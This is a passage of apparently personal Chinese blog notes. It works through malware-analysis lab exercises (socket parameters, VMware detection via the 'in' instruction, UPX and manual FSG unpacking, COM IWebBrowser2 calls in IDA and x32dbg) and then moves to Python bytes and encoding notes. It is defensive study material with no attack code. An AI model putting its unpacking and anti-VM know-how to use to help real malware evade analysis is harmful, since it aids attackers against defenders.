src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426235521309.png" alt="image-20220426235521309"></p><h1 id="15在0x10001701处是一个对socket的调用-它的3个参数是什么"><a class="markdownIt-Anchor" href="#15在0x10001701处是一个对socket的调用-它的3个参数是什么"></a> 15.在0x10001701处是一个对socket的调用。它的3个参数是什么？</h1><p>g键跳转到这个地址发现这3个参数，据说是符号常量</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426235712866.png" alt="image-20220426235712866" style="zoom:67%;"><p>然后对着这个常量右键-选择使用标准符号常量，可自己更改其显示的符号常量</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">socket参数详解<br><span class="hljs-type">int</span> socket(<span class="hljs-type">int</span> <span class="hljs-keyword">domain</span>, <span class="hljs-type">int</span> <span class="hljs-keyword">type</span>, <span class="hljs-type">int</span> protocol);<br><br><span class="hljs-keyword">domain</span>可以取以下参数<br>AF_INET:Address <span class="hljs-keyword">Family</span>，指定TCP/IP协议家族<br>PF_INET:Protocol <span class="hljs-keyword">Family</span><br>在windows中 AF_INET和PF_INET完全一样<br>在某些Linux中两者会有差距（但一般也相同），理论上建立socket时是指定协议，应该用PF_XXX,设置地址时用AF_XXX，不过在两者相等的情况下混用也没啥。<br>AF_UNIX：用于同一台计算机的进程间通信<br>AF_INET6:ipv6网络协议<br><br><br><span class="hljs-keyword">type</span>:套接字类型<br>SOCK_STREAM:流套接字，对应TCP协议<br>SOCK_DGRAM:数据报套接字，对应UDP协议<br>SOCK_RAW:原始套接字，提供原始网络协议存取<br>SOCK_PACKET:直接从网络驱动获取数据，即从数据链路层开始处理（过时了）<br>如果想获取数据链路层，可用socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL))<br><br>protocol:协议类型<br>传输层：IPPROTO_TCP、IPPROTO_UDP、IPPROTO_ICMP<br>网络层：htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL)<br><br></code></pre></td></tr></table></figure><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220427000529385.png" alt="image-20220427000529385"></p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220427000624001.png" alt="image-20220427000624001" style="zoom:67%;"><h1 id="16就是上面使用符号常量的过程"><a class="markdownIt-Anchor" href="#16就是上面使用符号常量的过程"></a> 16.就是上面使用符号常量的过程</h1><h1 id="17搜索in指令opcode-0xed的使用-这个指令和一个魔术字符串vmxh用来进行vmware检测-这在这个恶意代码中被使用了吗使用对执行in指令函数的交叉引用能发现进一步检测vmware的证据吗"><a class="markdownIt-Anchor" href="#17搜索in指令opcode-0xed的使用-这个指令和一个魔术字符串vmxh用来进行vmware检测-这在这个恶意代码中被使用了吗使用对执行in指令函数的交叉引用能发现进一步检测vmware的证据吗"></a> 17.搜索in指令（opcode 0xED）的使用。这个指令和一个魔术字符串VMXh用来进行VMware检测。这在这个恶意代码中被使用了吗？使用对执行in指令函数的交叉引用，能发现进一步检测VMware的证据吗？</h1><p>搜索里选择字节搜索，然后把这个勾上</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220427001010389.png" alt="image-20220427001010389" style="zoom:67%;"><p>找到in这个指令</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220427001107593.png" alt="image-20220427001107593" style="zoom:67%;"><p>跳转过去就可以看到这个字符串</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220427001156478.png" alt="image-20220427001156478"></p>]]></content>
    
    
    <categories>
      
      <category>逆向学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析Lab-1</title>
    <link href="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/"/>
    <url>/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章实验"><a class="markdownIt-Anchor" href="#第一章实验"></a> 第一章实验</h1><h2 id="ida快捷键"><a class="markdownIt-Anchor" href="#ida快捷键"></a> ida快捷键</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs armasm">空格键    反汇编窗口切换文本跟图形<br><span class="hljs-symbol">ESC</span>退到上一个操作地址<br>G搜索地址或者符号<br>N重命名<br>分号键   注释<br><span class="hljs-symbol">ALT</span>+M  添加标签<br><span class="hljs-symbol">CTRL</span>+M 列出所有标签<br><span class="hljs-symbol">CTRL</span> +S  二进制段的开始地址结束地址<br>C <span class="hljs-meta">code</span>   光标地址出内容解析成代码<br>P       在函数开始处使用P，从当前地址处解析成函数<br>D  <span class="hljs-meta">data</span>解析成数据<br>A   ASCII解析成ASCII<br>U   unDefined解析成未定义的内容<br>X  交叉引用<br><span class="hljs-symbol">F5</span>  C伪代码<br>菜单栏中的搜索功能中<br>有ALT+T 搜索文本<br><span class="hljs-symbol">ALT</span>+<span class="hljs-keyword">B</span> 搜索<span class="hljs-number">16</span>进制 搜索opcode 如ELF文件头<br>打开断点列表 CTRL+ALT+B<br>单步步入 <span class="hljs-built_in">F7</span><br>单步不过 F8<br>运行到函数返回地址 CTRL+<span class="hljs-built_in">F7</span><br>运行到光标处 <span class="hljs-built_in">F4</span><br></code></pre></td></tr></table></figure><p>常见dll函数</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404234608216.png" alt="image-20220404234608216"></p><h1 id="lab1-1"><a class="markdownIt-Anchor" href="#lab1-1"></a> Lab1-1</h1><p>Lab01-01.exe和Lab01-01.dll</p><p><strong>1．将文件上传至 <a href="http://www.VirusTotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%B9%E5%BE%81%EF%BC%9F">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件的特征？</a></strong></p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404222643932.png" alt="image-20220404222643932" style="zoom: 44;"><p><strong>2.这些文件是什么时候编译的?</strong></p><p>exe：</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404222756154.png" alt="image-20220404222756154" style="zoom: 50%;"><p>dll：</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404222833420.png" alt="image-20220404222833420" style="zoom:50%;"><p><strong>3.这两个文件中是否存在迹象说明它们是否被加壳或混淆了?如果是，这些迹象在哪里?</strong></p><p>用peid分析，能够正常识别编译环境，ep段正常，所以没有加密或者混淆</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404230056042.png" alt="image-20220404230056042" style="zoom: 67%;"><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404230132634.png" alt="image-20220404230132634" style="zoom:67%;"><p><strong>4.是否有导入函数显示出了这个恶意代码是做什么的?如果是，是哪些导入函数?</strong></p><p>Lab01-01.dll的导入函数：</p><p><strong>Wsock32.dll和Ws2_32.dll这两个是联网DLL，访问其中任何一个DLL的程序非常可能连接网络，或是执行网络相关的任务</strong>。</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404230936300.png" alt="image-20220404230936300" style="zoom:67%;"><p>Lab01-01.exe的导入函数：</p><p><strong>FindFirstFile和FindNextFile函数是特别值得关注的，因为它们提供的功能是搜索一个目录下所有的文件。</strong></p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404231310246.png" alt="image-20220404231310246" style="zoom:67%;"><p>Lab01-01.exeexe，根据ida的字符串分析（ctrl+f12）可得到C:\Windows\System32\kerne132.dll可能是程序运行的特征</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404231801690.png" alt="image-20220404231801690"></p><h1 id="lab1-2"><a class="markdownIt-Anchor" href="#lab1-2"></a> Lab1-2</h1><p>peid的ep段显示upx1，说明文件可能加壳了</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404232933256.png" alt="image-20220404232933256" style="zoom:80%;"><p>upx -d 脱壳</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404234057741.png" alt="image-20220404234057741" style="zoom:67%;"><p>脱壳后正常显示了</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404234206754.png" alt="image-20220404234206754" style="zoom:67%;"><p>上传网页分析，得到导入函数</p><p>WININET.dll，ADVAPI32.dll说明这个程序可能进行网络和进程的操作</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404234427730.png" alt="image-20220404234427730" style="zoom:67%;"><p>通过ida的字符串分析</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404234925588.png" alt="image-20220404234925588"></p><p>这里可能是创建了一个名为MalService的服务（DisplayName的内容就是MalService）</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404235344187.png" alt="image-20220404235344187" style="zoom:67%;"><h3 id="验证样本传输的网络数据"><a class="markdownIt-Anchor" href="#验证样本传输的网络数据"></a> 验证样本传输的网络数据</h3><p>使用od分析，右键中文搜索引擎，智能搜索，找到网站</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220404235856331.png" alt="image-20220404235856331" style="zoom: 50%;"><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220405001409765.png" alt="image-20220405001409765" style="zoom: 67%;"><p>主线程窗口中选择数据窗口跟随（主线程窗口放大即可找到数据窗口）</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220405001453388.png" alt="image-20220405001453388" style="zoom:50%;"><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220405001229162.png" alt="image-20220405001229162" style="zoom:67%;"><p>改成127.0.0.1，用00填充剩下的位置</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220405170214320.png" alt="image-20220405170214320" style="zoom: 67%;"><p>然后右键选择复制到可执行文件，然后再右键保存文件</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220405173030229.png" alt="image-20220405173030229"></p><p>PS：一直捕捉不到样本的网络数据，并且调试的时候会卡住，故放弃了。。。</p><h1 id="lab1-3"><a class="markdownIt-Anchor" href="#lab1-3"></a> Lab1-3</h1><p>首先可以看到这是个fsg壳，看到有人试过了，所以我也决定尝试手动脱壳试试</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220407235939049.png" alt="image-20220407235939049"></p><p>使用x32dbg，技巧就是f4过跳转，f8走，直到看到一个大跳，跟进去看看</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408000554875.png" alt="image-20220408000554875" style="zoom:67%;"><p>如果到了系统领空，可以alt+f9跳出去</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408000629401.png" alt="image-20220408000629401" style="zoom:67%;"><p>猜测这个就是程序的oep，在反汇编窗口中转到这个地址，然后直接f4看看</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408001010734.png" alt="image-20220408001010734"></p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408001507799.png" alt="image-20220408001507799" style="zoom:67%;"><p>然后使用这个插件，先dump一份</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408001453582.png" alt="image-20220408001453582"></p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408002127337.png" alt="image-20220408002127337" style="zoom: 67%;"><p>然后点击自动搜索IAT表和获取导入表</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408001835717.png" alt="image-20220408001835717" style="zoom: 67%;"><p>最后修复dump的文件即可</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408002238168.png" alt="image-20220408002238168" style="zoom:67%;"><p>导入表内容</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408003250804.png" alt="image-20220408003250804" style="zoom: 67%;"><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408003313799.png" alt="image-20220408003313799" style="zoom:67%;"><p>拖进ida，这个psz就是这个网址，可能程序会与这个网址进行连接</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408003447040.png" alt="image-20220408003447040"></p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408003430268.png" alt="image-20220408003430268" style="zoom:67%;"><p>CoCreateInstance的官方文档</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance">CoCreateInstance function （combaseapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p><p>相关文章<a href="https://www.cnblogs.com/QKSword/p/10927987.html">COM组件的逆向 - QKSword - 博客园 (cnblogs.com)</a></p><p><a href="https://www.freebuf.com/news/207966.html">TOD赤橙黄绿青蓝紫队系列：COM之恶 - FreeBuf网络安全行业门户</a></p><p>参考以上文章，com组件使用之前需要初始化，初始化com组件之后，使用函数CoCreateInstance来调用对象和接口，第一个参数使用CLSID指定了对象，第四个参数使用IID指定了接口，最后一个参数为获得的接口指针。</p><p>原型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HRESULT <span class="hljs-title">CoCreateInstance</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  [in]  REFCLSID  rclsid,</span></span><br><span class="hljs-function"><span class="hljs-params">  [in]  LPUNKNOWN pUnkOuter,</span></span><br><span class="hljs-function"><span class="hljs-params">  [in]  DWORD     dwClsContext,</span></span><br><span class="hljs-function"><span class="hljs-params">  [in]  REFIID    riid,</span></span><br><span class="hljs-function"><span class="hljs-params">  [out] LPVOID    *ppv</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><p>iid和clsid的结构</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408143329179.png" alt="image-20220408143329179"></p><p>样本中查看其clsid为0002DF01-0000-0000-C000-000000000046</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408143206824.png" alt="image-20220408143206824"></p><p>可以直接在注册表里搜索（clsid在注册表HKEY_CLASSES_ROOT\CLSID下，IID在HKEY_CLASSES_ROOT\Interface或HKLM\Software\Classes\Interface下）</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408143924597.png" alt="image-20220408143924597" style="zoom:67%;"><p>这里获取到的<strong>IID</strong>是<strong>D30C1661-CDAF-11D0-8A3E-00C04FC9E26E</strong></p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408150731857.png" alt="image-20220408150731857"></p><p>可以谷歌或者百度看看这个GUID对应的接口是什么，这里是IWebBrowser2</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408150943440.png" alt="image-20220408150943440"></p><p>找到接口之后，在ida的结构体窗口添加这个标准结构体（Vtbl是虚函数表的意思）</p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408154815435.png" alt="image-20220408154815435" style="zoom:67%;"><p>对于这个指针，右键convert to struct与结构体建立联系，就可以看到调用的函数是什么了</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408160058127.png" alt="image-20220408160058127"></p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408161004654.png" alt="image-20220408161004654"></p><p>之后就可以知道正确调用的函数了</p><p><img src="/2022/04/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90Lab-1/image-20220408160839433.png" alt="image-20220408160839433"></p><p>这里可以看到是使用了IWebBrowser2::Navigate方法<a href="https://docs.microsoft.com/en-us/previous-versions/bb415532(v=msdn.10)?redirectedfrom=MSDN">IWebBrowser2：：导航|微软文档 (microsoft.com)</a>打开了这个url</p>]]></content>
    
    
    <categories>
      
      <category>逆向学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习-4</title>
    <link href="/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/"/>
    <url>/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="41-字符问题"><a class="markdownIt-Anchor" href="#41-字符问题"></a> 4.1 字符问题</h1><p>把码位转换成字节序列的过程是编码<strong>encode</strong>；把字节序列转换成码位的过程是解码<strong>decode</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&#x27;café&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>b = s.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<span class="hljs-comment"># 使用 UTF-8 把 str 对象编码成 bytes 对象,编码后“é”是2个字节。</span><br><span class="hljs-built_in">print</span>(b,<span class="hljs-built_in">len</span>(b))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">4</span><br><span class="hljs-string">b&#x27;caf\xc3\xa9&#x27; 5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(b.decode(<span class="hljs-string">&#x27;utf8&#x27;</span>),<span class="hljs-built_in">len</span>(b))<span class="hljs-comment"># 使用 UTF-8 把 bytes 对象解码成 str 对象。</span><br><span class="hljs-comment">#café 5</span><br></code></pre></td></tr></table></figure><h1 id="42-字节概要"><a class="markdownIt-Anchor" href="#42-字节概要"></a> 4.2 字节概要</h1><p><strong>bytes 或 bytearray 对象的各个元素是介于 0~255（含）之间的整数</strong>，而不像 Python 2 的 str 对象那样是单个的字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#4.2</span><br>cafe = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&#x27;café&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf_8&#x27;</span>) <span class="hljs-comment"># bytes 对象可以从 str 对象使用给定的编码构建。</span><br><span class="hljs-built_in">print</span>(cafe[<span class="hljs-number">0</span>]) <span class="hljs-comment">#各个元素是 range(256) 内的整数。</span><br><span class="hljs-comment">#99</span><br><span class="hljs-built_in">print</span>(cafe[:<span class="hljs-number">1</span>]) <span class="hljs-comment">#bytes 对象的切片还是 bytes 对象，即使是只有一个字节的切片。</span><br><span class="hljs-comment">#b&#x27;c&#x27;</span><br>cafe_arr = <span class="hljs-built_in">bytearray</span>(cafe)<br><span class="hljs-built_in">print</span>(cafe_arr)<br><span class="hljs-comment">#bytearray(b&#x27;caf\xc3\xa9&#x27;)</span><br><span class="hljs-built_in">print</span>(cafe_arr[-<span class="hljs-number">1</span>:])<br><span class="hljs-comment">#bytearray(b&#x27;\xa9&#x27;)</span><br></code></pre></td></tr></table></figure><p>虽然二进制序列其实是整数序列，但是它们的<strong>字面量表示法表明其中有 ASCII 文本。</strong></p><p>因此，<strong>各个字节的值可能会使用下列三种不同的方式显示</strong>。</p><p>可打印的 ASCII 范围内的字节（从空格到 ~），使用 ASCII 字符本身。</p><p>制表符、换行符、回车符和 \ 对应的字节，使用转义序列 \t、\n、\r 和 \。</p><p>其他字节的值，使用十六进制转义序列（例如，\x00 是空字节）。</p><p>因此，我们看到的是 b’caf\xc3\xa9’：前 3 个字节 b’caf’ 在可打印的 ASCII 范围内，</p><p>**二进制序列有个类方法是 str 没有的，名为 fromhex，**它的作用是解 析十六进制数字对（数字对之间的空格是可选的），构建二进制序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;31 45 FF FF&#x27;</span>))<br><span class="hljs-comment">#b&#x27;1E\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure><p>使用缓冲类对象构建二进制序列是一种低层操作，可能涉及类型转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> number<br>number = array.array(<span class="hljs-string">&#x27;h&#x27;</span>,[-<span class="hljs-number">1</span>,-<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>])<br>octets = <span class="hljs-built_in">bytes</span>(number)<br><span class="hljs-built_in">print</span>(octets)<br><span class="hljs-comment">#b&#x27;\xff\xff\xfe\xff\x00\x00\x01\x00\x01\x00\x02\x00&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="结构体和内存视图"><a class="markdownIt-Anchor" href="#结构体和内存视图"></a> 结构体和内存视图</h1><p>struct 模块提供了一些函数，把打包的字节序列转换成不同类型字段 组成的元组，还有一些函数用于执行反向转换，把元组转换成打包的字节序列。struct 模块能处理 bytes、bytearray 和 memoryview 对象。</p><p>这里用了PNG图了，知道意思就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br>fmt = <span class="hljs-string">&#x27;&lt;4s3sHH&#x27;</span> <span class="hljs-comment"># 结构体的格式：&lt; 是小字节序，3s3s 是两个 3 字节序列，HH 是两个16 位二进制整数。</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(BASE_DIR+<span class="hljs-string">&#x27;/1.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    png = <span class="hljs-built_in">memoryview</span>(fp.read()) <span class="hljs-comment">#用内存中的文件内容创建一个 memoryview 对象</span><br>header  = png[:<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(header))<br><span class="hljs-built_in">print</span>(struct.unpack(fmt,header))<span class="hljs-comment">#拆包 memoryview 对象，得到一个元组，包含类型、版本、宽度和高度。</span><br><span class="hljs-keyword">del</span> header<br><span class="hljs-keyword">del</span> png<br><span class="hljs-comment"># 删除引用，释放 memoryview 实例所占的内存。</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(b&#x27;\x89PNG&#x27;, b&#x27;\r\n\x1a&#x27;, 10, 0)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="43-基本的编解码器"><a class="markdownIt-Anchor" href="#43-基本的编解码器"></a> 4.3 基本的编解码器</h1><p>Python 自带了超过 100 种编解码器（codec, encoder/decoder），用于在文本和字节之间相互转换。每个编解码器都有一个名称，如 ‘utf_8’， 而且经常有几个别名，<strong>如 ‘utf8’、‘utf-8’ 和 ‘U8’。这些名称可以传给 open()、str.encode()、bytes.decode() 等函数的 encoding 参数。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#4.3</span><br><span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;latin_1&#x27;</span>, <span class="hljs-string">&#x27;utf_8&#x27;</span>, <span class="hljs-string">&#x27;utf_16&#x27;</span>]:<br>    <span class="hljs-built_in">print</span>(codec, <span class="hljs-string">&#x27;El Niño&#x27;</span>.encode(codec), sep=<span 